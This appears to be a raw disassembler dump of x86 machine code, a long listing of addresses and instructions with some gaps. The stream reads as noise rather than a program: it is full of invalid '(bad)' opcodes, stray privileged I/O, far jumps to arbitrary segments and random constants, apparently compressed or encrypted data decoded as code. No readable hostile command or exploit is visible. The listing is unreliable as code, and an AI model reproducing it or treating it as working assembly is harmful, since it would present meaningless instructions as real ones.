  4262c0:	mov    al,ds:0xc08df68a
  4262c5:	sti    
  4262c6:	and    BYTE PTR [esi+0x315a0a85],bh
  4262cc:	das    
  4262cd:	and    BYTE PTR [ebp-0x3a],al
  4262d0:	cmp    eax,0x1feb2de9
  4262d5:	into   
  4262d6:	jnp    0x426264
  4262d8:	jmp    0x4262cd
  4262da:	pop    edx
  4262db:	push   cs
  4262dc:	fwait
  4262dd:	inc    ebx
  4262de:	push   0xccc6b109
  4262e3:	and    BYTE PTR [esi],ah
  4262e5:	sub    eax,0xafeaa45e
  4262ea:	add    cl,BYTE PTR [esp+eax*2+0x54]
  4262ee:	stos   BYTE PTR es:[edi],al
  4262ef:	test   BYTE PTR [ebp+0x77],bl
  4262f2:	repnz shrd DWORD PTR [ebx+0xdd5abc6],ecx,0x33
  4262fb:	idiv   BYTE PTR cs:[edx]
  4262fe:	aas    
  4262ff:	mov    al,0xad
  426301:	cmc    
  426302:	icebp  
  426303:	fwait
  426304:	sbb    al,0x39
  426306:	in     al,0x67
  426308:	mov    ds:0xdc0fb20,eax
  42630d:	push   eax
  42630e:	mov    al,0x4
  426310:	fild   DWORD PTR [eax]
	...
  426372:	add    BYTE PTR [eax],al
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xbec63009
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xef000001
  42638d:	fsubr  QWORD PTR [edx]
  42638f:	mov    edx,0xde914992
  426394:	dec    edx
  426395:	inc    edx
  426396:	cmp    bh,BYTE PTR [ebx+0x1e]
  426399:	lea    edi,[ebx+ebp*8-0xf024b77]
  4263a0:	rcl    BYTE PTR fs:[ebx],1
  4263a3:	pop    es
  4263a4:	dec    edx
  4263a5:	pop    ebx
  4263a6:	inc    esp
  4263a7:	jo     0x4263d0
  4263a9:	cdq    
  4263aa:	loop   0x4263c7
  4263ac:	iret   
  4263ad:	xchg   BYTE PTR [ebx+0x12],al
  4263b0:	jle    0x426363
  4263b2:	xor    eax,0xc715f957
  4263b7:	dec    ebp
  4263b8:	enter  0xa1c3,0x3b
  4263bc:	pop    ss
  4263bd:	jg     0x426392
  4263bf:	push   eax
  4263c0:	(bad)  
  4263c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263c2:	div    BYTE PTR [esi+edx*8+0x24]
  4263c6:	jp     0x4263be
  4263c8:	jo     0x426350
  4263ca:	jmp    0x426422
  4263cc:	arpl   WORD PTR [eax],di
  4263ce:	stos   BYTE PTR es:[edi],al
  4263cf:	sbb    BYTE PTR [ebp+0x7d],al
  4263d2:	adc    al,0x47
  4263d4:	not    BYTE PTR [esi+0x3f3a1b80]
  4263da:	xchg   esp,eax
  4263db:	ret    
  4263dc:	rcl    BYTE PTR [eax-0x50],1
  4263df:	cmp    esp,eax
  4263e1:	and    ecx,eax
  4263e3:	xchg   edx,eax
  4263e4:	sbb    eax,0x1110ba35
  4263e9:	mov    BYTE PTR [esi+0x2c],bl
  4263ec:	xchg   DWORD PTR [edx-0x12cad25a],ecx
  4263f2:	fimul  DWORD PTR [edx]
  4263f4:	aam    0x70
  4263f6:	stos   DWORD PTR es:[edi],eax
  4263f7:	and    eax,0xbc845e70
  4263fc:	mov    ds:0x69685201,al
  426401:	or     eax,0xe94cd9bf
  426406:	ss icebp 
  426408:	lea    ecx,[ebx+0x2faf80f2]
  42640e:	sbb    DWORD PTR [eax-0x13bbd27e],edi
  426414:	popa   
  426415:	cmp    DWORD PTR [edi-0x46a16e4f],esi
  42641b:	ss pop es
  42641d:	into   
  42641e:	fmul   QWORD PTR [edx-0x24fffed3]
  426424:	(bad)  
  426426:	sub    eax,0x5afdd736
  42642c:	pop    eax
  42642d:	(bad)
  426430:	xchg   ebx,eax
  426431:	ins    BYTE PTR es:[edi],dx
  426432:	fcom   DWORD PTR [edi+0x49288b97]
  426438:	outs   dx,DWORD PTR ds:[esi]
  426439:	nop
  42643a:	jno    0x42641a
  42643c:	xchg   ecx,eax
  42643d:	pop    esp
  42643e:	loopne 0x42648d
  426440:	clc    
  426441:	pop    edi
  426442:	mov    edx,0x3ee520ad
  426447:	and    ah,ch
  426449:	xor    esp,0x49
  42644c:	xchg   ecx,eax
  42644d:	retf   0x58e4
  426450:	out    0xc9,al
  426452:	dec    ebp
  426453:	mov    ebp,0x980c43b7
  426458:	adc    eax,0x6466e16a
  42645d:	push   ebx
  42645e:	frstor [ecx+ebp*2+0x51]
  426462:	adc    DWORD PTR ds:0x8e809f31,edx
  426468:	lea    eax,[eax]
  42646a:	xor    eax,0x31d35ec3
  42646f:	push   esp
  426470:	mov    ebx,0xb0822833
  426475:	inc    esp
  426476:	ss jns 0x4264f5
  426479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42647a:	ret    0x7938
  42647d:	jmp    0xb790:0xb9628bf1
  426484:	repnz aam 0x7e
  426487:	mov    ebx,0x165e3643
  42648c:	mov    esi,0x52adcc38
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [ebp+0x47],edx
  426502:	inc    edx
  426503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426504:	mov    al,0x99
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0xb7000001
  42650d:	test   ebx,0x24629504
  426513:	push   ds
  426514:	out    0xc1,eax
  426516:	test   eax,0x8c6f8f5a
  42651b:	(bad)  
  42651d:	mov    eax,0x61c6631
  426522:	sub    ecx,esp
  426524:	call   0xa511:0xae4728f3
  42652b:	pop    esp
  42652c:	add    eax,0xcb9f1cbe
  426531:	out    dx,eax
  426532:	leave  
  426533:	inc    eax
  426534:	jmp    0x73ac81fd
  426539:	push   ecx
  42653a:	adc    eax,0x6b7fa51
  42653f:	and    al,0xdb
  426541:	leave  
  426542:	pushf  
  426543:	aad    0x3f
  426545:	pop    ds
  426546:	enter  0x3af0,0xc7
  42654a:	pop    eax
  42654b:	ss sahf 
  42654d:	mov    dl,0xee
  42654f:	jp     0x426551
  426551:	aas    
  426552:	(bad)  
  426553:	pop    es
  426554:	push   ebp
  426555:	push   ds
  426556:	or     edx,ecx
  426558:	call   0x9c321a10
  42655d:	push   ss
  42655e:	push   edx
  42655f:	pushf  
  426560:	call   0x6a7262c3
  426565:	dec    ebp
  426566:	loope  0x4264ec
  426568:	mov    eax,0x2c0a78f9
  42656d:	shr    bh,cl
  42656f:	js     0x4265be
  426571:	call   0x3ee2:0x6bf7bfe3
  426578:	ja     0x426546
  42657a:	xor    ebx,0x532a1dc2
  426580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426581:	imul   esp,DWORD PTR [ebx+edx*4+0xce49db7],0x5c
  426589:	dec    eax
  42658a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42658b:	sub    bh,BYTE PTR [ecx]
  42658d:	mov    cl,0x50
  42658f:	gs arpl si,cx
  426592:	xchg   esi,eax
  426593:	mov    al,ds:0xb7023abf
  426598:	lds    ecx,FWORD PTR [esi-0x72]
  42659b:	fldcw  WORD PTR [ecx-0x29]
  42659e:	push   ebx
  42659f:	push   ss
  4265a0:	out    0xbb,eax
  4265a2:	push   0x521294c8
  4265a7:	dec    ebx
  4265a8:	jne    0x426618
  4265aa:	jne    0x4265aa
  4265ac:	xor    edx,DWORD PTR [esi]
  4265ae:	sahf   
  4265af:	outs   dx,BYTE PTR ds:[esi]
  4265b0:	push   ebp
  4265b1:	in     al,dx
  4265b2:	data16 sub BYTE PTR [ebx+0x26],bh
  4265b6:	push   es
  4265b7:	mov    ebp,0xd56e471d
  4265bc:	mov    ecx,0x586aa970
  4265c1:	mov    al,ds:0xbad60328
  4265c6:	mov    ch,0x4f
  4265c8:	int3   
  4265c9:	mov    dh,0x86
  4265cb:	loopne 0x4265a2
  4265cd:	adc    al,0xec
  4265cf:	mov    al,0x5
  4265d1:	popa   
  4265d2:	mov    cl,0x5e
  4265d4:	nop
  4265d5:	or     BYTE PTR [edi+0x2c],dh
  4265d8:	pop    ecx
  4265d9:	inc    esi
  4265da:	mov    edx,0x895ef0ad
  4265df:	pusha  
  4265e0:	stos   BYTE PTR es:[edi],al
  4265e1:	sbb    BYTE PTR [ebx],0xae
  4265e4:	xor    BYTE PTR [edx],bl
  4265e6:	mov    ?,edx
  4265e8:	je     0x42659a
  4265ea:	jno    0x4265cc
  4265ec:	sub    BYTE PTR [esi+ebx*1-0x749baa26],dl
  4265f3:	adc    ch,BYTE PTR [ecx]
  4265f5:	fidiv  DWORD PTR [ebx-0x18ce74d2]
  4265fb:	(bad)  
  4265fc:	jg     0x426616
  4265fe:	enter  0xbaf5,0x17
  426602:	(bad)  
  426603:	adc    eax,0x35f5890c
  426608:	cld    
  426609:	and    esp,DWORD PTR [ecx]
  42660b:	dec    edx
  42660c:	call   0x0:0xef10dc3c
	...
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x50e96da4]
  426682:	xchg   edi,eax
  426683:	mov    ds:0x19ab5,eax
  426688:	add    eax,0xc3000001
  42668d:	dec    edx
  42668e:	pop    esp
  42668f:	sbb    edi,ebx
  426691:	dec    ebp
  426692:	popf   
  426693:	and    al,0x84
  426695:	or     eax,0x7471b1a7
  42669a:	arpl   WORD PTR [esi],bp
  42669c:	icebp  
  42669d:	push   esp
  42669e:	jo     0x4266d5
  4266a0:	imul   esp,DWORD PTR [ecx],0x8f8bc16f
  4266a6:	or     ch,dl
  4266a8:	and    BYTE PTR [edi],dl
  4266aa:	xchg   esi,eax
  4266ab:	test   BYTE PTR [esi+0x66132715],ch
  4266b1:	lock dec edi
  4266b3:	(bad)  
  4266b4:	jno    0x4266a2
  4266b6:	stos   BYTE PTR es:[edi],al
  4266b7:	fsubr  QWORD PTR [ebx+0x67cbf8d5]
  4266bd:	push   ss
  4266be:	sub    eax,0xf651163f
  4266c3:	stos   DWORD PTR es:[edi],eax
  4266c4:	dec    BYTE PTR [edx-0x44]
  4266c7:	aad    0xb6
  4266c9:	std    
  4266ca:	mov    eax,ds:0x860ddc8a
  4266cf:	mov    edx,0x13e9eb22
  4266d4:	dec    edx
  4266d5:	es mov esi,cs
  4266d8:	std    
  4266d9:	cs jns 0x426747
  4266dc:	jo     0x4266cd
  4266de:	shl    BYTE PTR [ecx-0x5b],cl
  4266e1:	and    BYTE PTR [ecx-0x61288e70],ah
  4266e7:	cmc    
  4266e8:	mov    ebp,esp
  4266ea:	push   0xdb050dc5
  4266ef:	push   ds
  4266f0:	jle    0x4266c9
  4266f2:	out    0x67,al
  4266f4:	lock mov bh,BYTE PTR [ebx-0x78]
  4266f8:	xor    esp,ebx
  4266fa:	cwde   
  4266fb:	inc    ebp
  4266fc:	cmp    ch,BYTE PTR [ebx-0x1b]
  4266ff:	mov    bl,BYTE PTR [edi-0x17]
  426702:	pop    edx
  426703:	mov    ah,0x24
  426705:	clc    
  426706:	mov    edi,0x645aff68
  42670b:	and    eax,0xbe892fd0
  426710:	or     eax,0x46e5f081
  426715:	clc    
  426716:	add    BYTE PTR ds:0x1b8bd82a,ah
  42671c:	in     al,0xd2
  42671e:	sti    
  42671f:	shl    ebx,cl
  426721:	retf   0x188a
  426724:	push   esp
  426725:	push   ebp
  426726:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426728:	push   edx
  426729:	mov    edx,DWORD PTR [ecx+edx*1+0x54]
  42672d:	inc    eax
  42672e:	bound  ebp,QWORD PTR [edi-0x44a15591]
  426734:	fimul  WORD PTR [eax]
  426736:	xchg   ecx,eax
  426737:	mov    esp,0xf8bd30e5
  42673c:	push   edi
  42673d:	adc    DWORD PTR [ecx],ebp
  42673f:	(bad)  
  426740:	xor    esp,DWORD PTR [eax+0x64]
  426743:	sbb    BYTE PTR [esi-0x5e],cl
  426746:	ror    BYTE PTR [ebx],cl
  426748:	xor    edx,DWORD PTR [eax]
  42674a:	jnp    0x426728
  42674c:	cli    
  42674d:	push   ecx
  42674e:	cmc    
  42674f:	aaa    
  426750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426751:	sahf   
  426752:	fcomp  QWORD PTR [ebx-0x34]
  426755:	add    ecx,DWORD PTR ds:0x8b8b0364
  42675b:	daa    
  42675c:	add    DWORD PTR [ecx+ebx*2],ebp
  42675f:	pop    es
  426760:	mov    ds:0x94dfd52b,eax
  426765:	push   esi
  426766:	cmp    BYTE PTR [ebx-0x62],ch
  426769:	add    al,0x53
  42676b:	iret   
  42676c:	cmp    ecx,DWORD PTR [eax]
  42676e:	hlt    
  42676f:	mov    al,0x22
  426771:	jnp    0x42677c
  426773:	mov    al,ds:0x9d3ee5b0
  426779:	fsub   QWORD PTR [edx-0xa6c023b]
  42677f:	hlt    
  426780:	push   esi
  426781:	mov    bl,BYTE PTR [edi-0x7c822251]
  426787:	mov    ecx,0x4c6d7183
  42678c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42678d:	int    0xe3
  42678f:	idiv   DWORD PTR [eax+0x0]
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	pop    es
  426801:	xchg   ecx,eax
  426802:	pop    ebp
  426803:	sub    edi,DWORD PTR [edx+0x500019b]
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    dl,ch
  42680d:	addr16 dec ecx
  42680f:	ja     0x426835
  426811:	call   0xab981a80
  426816:	dec    edx
  426817:	cmp    eax,0xdafe7662
  42681c:	inc    eax
  42681e:	mov    bh,0xf8
  426820:	mov    edi,0x2b68585a
  426825:	scas   al,BYTE PTR es:[edi]
  426826:	out    0x22,al
  426828:	sub    dh,bl
  42682a:	mov    DWORD PTR [ebp+0x4b43cee6],ecx
  426830:	or     ah,BYTE PTR [ebx-0x747d858b]
  426836:	xchg   BYTE PTR [edx],al
  426838:	xor    DWORD PTR [edi],edi
  42683a:	xor    ebp,eax
  42683c:	pop    ebp
  42683d:	cmp    ebx,esi
  42683f:	mov    edi,DWORD PTR [eax]
  426841:	int3   
  426842:	(bad)  
  426843:	xor    al,0xeb
  426845:	xor    al,dh
  426847:	jnp    0x42687b
  426849:	sahf   
  42684a:	pop    esi
  42684b:	shl    BYTE PTR [ebx-0x2e],0xb0
  42684f:	inc    esi
  426850:	dec    ecx
  426851:	inc    DWORD PTR [edx-0x354ee2d0]
  426857:	xchg   edi,eax
  426858:	dec    eax
  426859:	sbb    BYTE PTR [edi],0x93
  42685c:	push   esp
  42685d:	add    cl,BYTE PTR [ecx]
  42685f:	call   0x64eceb7d
  426864:	ins    BYTE PTR es:[edi],dx
  426865:	cmp    esi,ecx
  426867:	loop   0x4268c1
  426869:	pop    ebp
  42686a:	punpcklbw mm6,DWORD PTR [edx]
  42686d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42686e:	call   0xc6ea:0x4d9ff7ce
  426875:	sbb    esp,esp
  426877:	cmp    DWORD PTR [ebx+0x43faf5b7],eax
  42687d:	cmp    al,BYTE PTR [edi+ebp*4-0x69016bc8]
  426884:	fwait
  426885:	mov    ds:0x15dad261,eax
  42688a:	mov    cl,0xf5
  42688c:	or     dl,dh
  42688e:	jl     0x4268fa
  426890:	(bad)  
  426891:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426893:	adc    dh,BYTE PTR [ebx]
  426895:	ret    0x2da4
  426898:	sbb    dh,BYTE PTR ss:[ebx]
  42689b:	int    0x3c
  42689d:	(bad)  
  42689e:	ffreep st(5)
  4268a0:	dec    edx
  4268a1:	data16 fwait
  4268a3:	add    DWORD PTR [ebx],ebx
  4268a5:	jne    0x426915
  4268a7:	inc    ebx
  4268a8:	call   DWORD PTR [edi]
  4268aa:	ins    DWORD PTR es:[edi],dx
  4268ab:	sub    DWORD PTR [eax+ebp*4],esp
  4268ae:	(bad)  
  4268af:	hlt    
  4268b0:	sar    BYTE PTR ds:0xef4ebabc,cl
  4268b6:	lock inc edx
  4268b8:	push   esi
  4268b9:	call   0xb7ed:0x97cebb91
  4268c0:	pop    edi
  4268c1:	jl     0x426917
  4268c3:	std    
  4268c4:	call   0x8f82:0x91f6ceaf
  4268cb:	out    dx,al
  4268cc:	in     al,dx
  4268cd:	and    BYTE PTR [ebx+esi*8],ch
  4268d0:	or     cl,ah
  4268d2:	and    BYTE PTR [ebx],bh
  4268d4:	fdiv   DWORD PTR [ebp+0x60]
  4268d7:	or     edx,0xffffff93
  4268da:	fs fs loop 0x426867
  4268de:	int    0x3d
  4268e0:	aaa    
  4268e1:	jp     0x426885
  4268e3:	mov    al,0x1b
  4268e5:	or     edx,eax
  4268e7:	push   0xc532a743
  4268ec:	sahf   
  4268ed:	clc    
  4268ee:	or     cl,BYTE PTR [ebx-0x42]
  4268f1:	cmp    eax,DWORD PTR ss:[ecx-0x287d4aab]
  4268f8:	out    dx,al
  4268f9:	dec    eax
  4268fa:	popf   
  4268fb:	mov    esi,DWORD PTR [ebp-0x18]
  4268fe:	push   edx
  4268ff:	cmp    DWORD PTR [ebx-0x2a3f6006],ebp
  426905:	shr    esi,1
  426907:	test   DWORD PTR [edx],ebp
  426909:	cli    
  42690a:	xor    al,0xf
  42690c:	cmp    BYTE PTR ds:0xa3c20c,al
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ecx,ecx
  426981:	mov    cl,ch
  426983:	lahf   
  426984:	mov    edi,0x500019c
  426989:	add    DWORD PTR [eax],eax
  42698b:	add    BYTE PTR [ebp+ebx*4+0x49],dl
  42698f:	mov    al,0xf4
  426991:	jmp    0xa72edb38
  426996:	cli    
  426997:	xlat   BYTE PTR ds:[ebx]
  426998:	sub    eax,0x7deccf7b
  42699d:	addr16 popa 
  42699f:	sbb    eax,0xcd4bf132
  4269a4:	jb     0x42694f
  4269a6:	add    bh,BYTE PTR [ebx-0x4faf38b1]
  4269ac:	or     cl,BYTE PTR [esi-0x677deb69]
  4269b2:	push   cs
  4269b3:	test   al,0xef
  4269b5:	inc    ebx
  4269b6:	test   eax,0xad874daa
  4269bb:	in     eax,0x72
  4269bd:	or     edx,DWORD PTR [ebp+0x42]
  4269c0:	js     0x426a2f
  4269c2:	jno    0x426958
  4269c4:	jo     0x426a40
  4269c6:	enter  0xbf1d,0x44
  4269ca:	fdivr  DWORD PTR [ecx]
  4269cc:	fld    st(5)
  4269ce:	or     BYTE PTR [edx],ch
  4269d0:	xchg   ebp,eax
  4269d1:	mov    DWORD PTR ds:0xf9c0b89c,ecx
  4269d7:	cmp    ebx,DWORD PTR [ebx-0x491536a0]
  4269dd:	fisttp DWORD PTR [eax+0x59]
  4269e0:	mov    edx,DWORD PTR [ebx+0x3a9b703f]
  4269e6:	adc    DWORD PTR [ebp-0x22bc9637],esi
  4269ec:	aas    
  4269ed:	test   al,0x56
  4269ef:	ds jle 0x426a39
  4269f2:	sbb    eax,0xe0fd7a76
  4269f7:	stos   DWORD PTR es:[edi],eax
  4269f8:	inc    esi
  4269f9:	jg     0x4269bf
  4269fb:	pop    ebx
  4269fc:	or     eax,0x3cdb4c14
  426a01:	sub    DWORD PTR [edx],ebp
  426a03:	icebp  
  426a04:	outs   dx,DWORD PTR ds:[esi]
  426a05:	jne    0x426a62
  426a07:	xor    dl,al
  426a09:	stos   BYTE PTR es:[edi],al
  426a0a:	mov    bl,dl
  426a0c:	sub    DWORD PTR [eax],ebx
  426a0e:	or     DWORD PTR [eax+eax*1],0x51c3515d
  426a15:	add    DWORD PTR ds:0xcaabcc6e,ebp
  426a1b:	sub    BYTE PTR [edx],0x2b
  426a1e:	add    ebx,eax
  426a20:	jne    0x426a44
  426a22:	fld    QWORD PTR [esi+0x49eae171]
  426a28:	add    BYTE PTR ds:0x4d4bc01f,bh
  426a2e:	repnz dec DWORD PTR [esi]
  426a31:	xchg   ebp,eax
  426a32:	mov    DWORD PTR [edi],edi
  426a34:	mov    ebx,DWORD PTR [edx-0x62]
  426a37:	arpl   WORD PTR [ebx+0x7e],sp
  426a3a:	ror    DWORD PTR [ebp-0xf],cl
  426a3d:	and    dh,BYTE PTR [esi+0x236255fb]
  426a43:	imul   ebx,DWORD PTR [edx+0x598d03ac],0x6b
  426a4a:	shl    edx,1
  426a4c:	inc    eax
  426a4d:	loope  0x426ab8
  426a4f:	loope  0x426acf
  426a51:	pop    ecx
  426a52:	inc    ecx
  426a53:	not    bh
  426a55:	dec    eax
  426a56:	xor    BYTE PTR [esi+ebx*1-0x785be0d3],dl
  426a5d:	mov    bl,0x21
  426a5f:	ins    BYTE PTR es:[edi],dx
  426a60:	adc    cl,ch
  426a62:	fwait
  426a63:	dec    edx
  426a64:	(bad)  [ebp-0x47430c88]
  426a6a:	ins    BYTE PTR es:[edi],dx
  426a6b:	cmp    BYTE PTR [esi+0x65664e4a],cl
  426a71:	sbb    al,0xe
  426a73:	mov    bh,0xb
  426a75:	pop    ds
  426a76:	scas   al,BYTE PTR es:[edi]
  426a77:	push   ecx
  426a78:	adc    ebp,ecx
  426a7a:	inc    edx
  426a7b:	push   ds
  426a7c:	and    ebp,DWORD PTR [esi+0x1627569c]
  426a82:	and    esi,0x23dfe19
  426a88:	adc    BYTE PTR [ebx-0x35],ch
  426a8b:	retf   0xdbdf
  426a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a8f:	push   edi
  426a90:	jmp    0x0:0x0
	...
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x53
  426b01:	jl     0x426b13
  426b03:	adc    al,0xc4
  426b05:	popf   
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0xb7000001
  426b0d:	dec    ebp
  426b0e:	pop    esp
  426b0f:	xchg   esi,ecx
  426b11:	add    dl,BYTE PTR [ebp+eax*8-0x2c]
  426b15:	pop    ss
  426b16:	je     0x426af1
  426b18:	jno    0x426af5
  426b1a:	std    
  426b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b1c:	scas   al,BYTE PTR es:[edi]
  426b1d:	mov    al,0x26
  426b1f:	mov    cl,0x2f
  426b21:	std    
  426b22:	cmp    DWORD PTR [eax+ecx*8+0x11],esi
  426b26:	cwde   
  426b27:	sar    BYTE PTR [edi-0x34],0xea
  426b2b:	adc    ch,al
  426b2d:	mov    esi,?
  426b2f:	(bad)  
  426b30:	xor    ebx,edx
  426b32:	daa    
  426b33:	push   ds
  426b34:	out    0x33,al
  426b36:	mov    edx,0xd1734d82
  426b3b:	repz cmp al,0xad
  426b3e:	repnz jecxz 0x426af5
  426b41:	loop   0x426ac8
  426b43:	jp     0x426b81
  426b45:	push   es
  426b46:	cmp    bl,bl
  426b48:	pop    ecx
  426b49:	xchg   ah,bl
  426b4b:	stc    
  426b4c:	mov    esp,0x312665be
  426b51:	sar    ebx,0x5
  426b54:	and    cl,BYTE PTR [edi]
  426b56:	imul   eax,DWORD PTR [esi-0x5a],0xffffffc6
  426b5a:	lods   eax,DWORD PTR ds:[esi]
  426b5b:	sub    DWORD PTR [ebx],edx
  426b5d:	aad    0x9e
  426b5f:	jb     0x426b2a
  426b61:	jno    0x426af7
  426b63:	outs   dx,DWORD PTR ds:[esi]
  426b64:	ret    
  426b65:	cmp    ch,ah
  426b67:	scas   al,BYTE PTR es:[edi]
  426b68:	sub    edi,DWORD PTR [eax-0x4]
  426b6b:	push   cs
  426b6c:	pop    edi
  426b6d:	fs sti 
  426b6f:	adc    bl,BYTE PTR [eax]
  426b71:	cmp    DWORD PTR [ebx-0x494a8c99],0xe169e9ef
  426b7b:	outs   dx,DWORD PTR es:[esi]
  426b7d:	and    esi,edi
  426b7f:	aas    
  426b80:	test   BYTE PTR [edx+0xb],dl
  426b83:	jb     0x426b6b
  426b85:	dec    ebp
  426b86:	mov    dh,0x4b
  426b88:	inc    esp
  426b89:	jae    0x426be6
  426b8b:	nop
  426b8c:	jmp    0x426b60
  426b8e:	data16 jp 0x426b18
  426b91:	cdq    
  426b92:	jecxz  0x426bec
  426b94:	clc    
  426b95:	mov    ds:0xeaadc763,eax
  426b9a:	shr    BYTE PTR [eax+0x6e8718c4],cl
  426ba0:	push   es
  426ba1:	and    eax,0x9f7e0294
  426ba6:	add    dl,BYTE PTR [ebp+ebp*1-0x6d]
  426baa:	jmp    0xa6aa5bcc
  426baf:	dec    ebx
  426bb0:	mov    ebp,eax
  426bb2:	fsub   DWORD PTR [edx+0x24cbed9f]
  426bb8:	jp     0x426bf4
  426bba:	adc    ebp,esi
  426bbc:	pop    ebp
  426bbd:	sbb    BYTE PTR fs:[edi-0x73],0x81
  426bc2:	xchg   ecx,eax
  426bc3:	mov    edx,0x50c0b820
  426bc8:	or     BYTE PTR [ebx+0x2f],cl
  426bcb:	sbb    DWORD PTR [ebx+0x24082d06],esi
  426bd1:	das    
  426bd2:	pushf  
  426bd3:	or     eax,0xf65780b0
  426bd8:	add    BYTE PTR [esp+edi*2-0x2ff44a8e],ah
  426bdf:	scas   al,BYTE PTR es:[edi]
  426be0:	xchg   BYTE PTR [edi],ah
  426be2:	mov    bh,0xb4
  426be4:	call   0x52306534
  426be9:	pop    ebp
  426bea:	arpl   WORD PTR [ebx+0x2a8a630c],ax
  426bf0:	pop    ebx
  426bf1:	mov    ch,0xd7
  426bf3:	xchg   ecx,eax
  426bf4:	outs   dx,DWORD PTR ds:[esi]
  426bf5:	lds    ecx,FWORD PTR [esi]
  426bf7:	mov    edx,DWORD PTR [edi+0x16f8405e]
  426bfd:	das    
  426bfe:	sub    al,0x1b
  426c00:	addr16 inc edx
  426c02:	mov    dl,BYTE PTR [ecx-0x4816a1fc]
  426c08:	xchg   esi,eax
  426c09:	sar    BYTE PTR [eax-0x5593ebf3],1
  426c0f:	iret   
  426c10:	xlat   BYTE PTR ds:[ebx]
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xdadece21
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x8000001
  426c8d:	xchg   esp,eax
  426c8e:	push   ds
  426c8f:	mov    al,ds:0x947026c0
  426c94:	xlat   BYTE PTR ds:[ebx]
  426c95:	xor    DWORD PTR [esi+0x76],esp
  426c98:	or     eax,DWORD PTR [eax+ecx*4+0x69]
  426c9c:	push   esp
  426c9d:	push   ds
  426c9e:	jns    0x426c25
  426ca0:	(bad)  
  426ca2:	push   edi
  426ca3:	test   DWORD PTR [ecx+0x6bfefc2a],edi
  426ca9:	inc    esp
  426caa:	jecxz  0x426c9a
  426cac:	(bad)  
  426cae:	xchg   ecx,eax
  426caf:	jb     0x426cc3
  426cb1:	add    DWORD PTR [ebp+0x43978e8c],esp
  426cb7:	rcl    DWORD PTR [ebp+0x4c6bfbd1],0x81
  426cbe:	mov    ds:0xfb7419e2,eax
  426cc3:	je     0x426c48
  426cc5:	xchg   ebx,eax
  426cc6:	lahf   
  426cc7:	push   0x77
  426cc9:	pop    esi
  426cca:	inc    ebx
  426ccb:	stos   DWORD PTR es:[edi],eax
  426ccc:	push   ds
  426ccd:	lods   al,BYTE PTR ds:[esi]
  426cce:	sub    esi,0x24b713f9
  426cd4:	xchg   DWORD PTR [edi+0x7d],edi
  426cd7:	scas   al,BYTE PTR es:[edi]
  426cd8:	fwait
  426cd9:	cmp    edx,edx
  426cdb:	cmp    DWORD PTR [esp+ebp*1+0x2],edi
  426cdf:	(bad)  
  426ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ce2:	pop    esp
  426ce3:	inc    ebx
  426ce4:	into   
  426ce5:	adc    ch,BYTE PTR [edx]
  426ce7:	add    ebp,edi
  426ce9:	aas    
  426cea:	or     DWORD PTR [ebx+0x3f],esi
  426ced:	sbb    ecx,ebx
  426cef:	inc    edi
  426cf0:	fwait
  426cf1:	sub    DWORD PTR [bp+0x7b],ebx
  426cf5:	jmp    0x350a:0x96095a24
  426cfc:	xor    eax,0xe78a33d8
  426d01:	xor    ch,BYTE PTR [esi+0x54]
  426d04:	data16 adc bl,ah
  426d07:	mul    ch
  426d09:	stos   DWORD PTR es:[edi],eax
  426d0a:	(bad)  
  426d0b:	frstor [edx-0x71]
  426d0e:	lods   al,BYTE PTR ds:[esi]
  426d0f:	repz push ecx
  426d11:	mov    ch,BYTE PTR [edi-0x44278a24]
  426d17:	aaa    
  426d18:	sub    eax,0x58be47a3
  426d1d:	daa    
  426d1e:	dec    edi
  426d1f:	out    dx,eax
  426d20:	mov    esp,0xda2126ca
  426d25:	inc    edx
  426d26:	icebp  
  426d27:	out    dx,al
  426d28:	inc    ecx
  426d29:	(bad)
  426d2d:	into   
  426d2e:	out    dx,al
  426d2f:	xchg   ebx,eax
